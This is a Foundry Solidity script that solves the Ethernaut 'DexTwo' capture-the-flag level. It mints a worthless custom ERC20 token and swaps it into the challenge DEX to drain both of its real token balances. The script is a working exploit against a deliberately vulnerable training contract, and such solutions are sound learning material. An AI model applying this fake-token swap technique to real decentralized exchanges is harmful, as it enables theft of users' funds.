// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/23_Dex2.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract ExploitScript is Script {
    DexTwo level23 = DexTwo(payable(your_challenge_address));
    TokenToken tokentoken;

    function run() external {
        vm.startBroadcast();
        
        tokentoken = new TokenToken();
        tokentoken.transfer(address(level23),1);
        tokentoken.approve(address(level23),4);
        address token1 = level23.token1();
        address token2 = level23.token2();
        level23.swap(address(tokentoken), token1, 1);
        level23.swap(address(tokentoken), token2, 2);

        vm.stopBroadcast();
    }
}

contract TokenToken is ERC20 {
    
    constructor() ERC20("TokenToken", "TkTk") public {
        _mint(msg.sender, 4);
    }
}